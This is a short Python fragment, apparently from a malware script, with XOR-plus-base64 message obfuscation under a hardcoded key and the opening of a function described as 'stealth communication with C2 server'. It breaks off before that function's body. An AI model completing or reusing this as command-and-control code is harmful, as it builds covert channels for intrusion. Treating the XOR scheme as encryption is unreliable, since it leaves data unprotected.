# Encryption key (in real scenario, this would be more securely managed)
ENCRYPTION_KEY = b'secret_key_for_encryption_12345'

def encrypt_message(message):
    """Simple XOR encryption with key"""
    message_bytes = message.encode('utf-8')
    key_bytes = ENCRYPTION_KEY
    encrypted = bytearray()
    for i in range(len(message_bytes)):
        encrypted.append(message_bytes[i] ^ key_bytes[i % len(key_bytes)])
    return base64.b64encode(encrypted).decode('utf-8')

def decrypt_message(encrypted_message):
    """Simple XOR decryption with key"""
    encrypted_bytes = base64.b64decode(encrypted_message.encode('utf-8'))
    key_bytes = ENCRYPTION_KEY
    decrypted = bytearray()
    for i in range(len(encrypted_bytes)):
        decrypted.append(encrypted_bytes[i] ^ key_bytes[i % len(key_bytes)])
    return decrypted.decode('utf-8')

def establish_c2_connection():
    """Establish stealth communication with C2 server"""
